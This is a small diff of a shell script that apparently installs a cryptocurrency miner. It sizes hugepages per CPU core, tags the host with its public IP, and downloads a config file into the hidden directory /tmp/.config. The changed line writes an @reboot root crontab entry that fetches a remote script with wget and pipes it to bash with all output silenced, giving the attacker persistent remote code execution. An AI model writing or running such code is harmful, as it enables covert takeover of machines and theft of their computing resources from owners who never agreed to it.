@@ -15,7 +15,7 @@ addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/n
 name="c${cores}_${addr}"
 
 sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
-sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 mkdir -p "/tmp/.config"
 wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
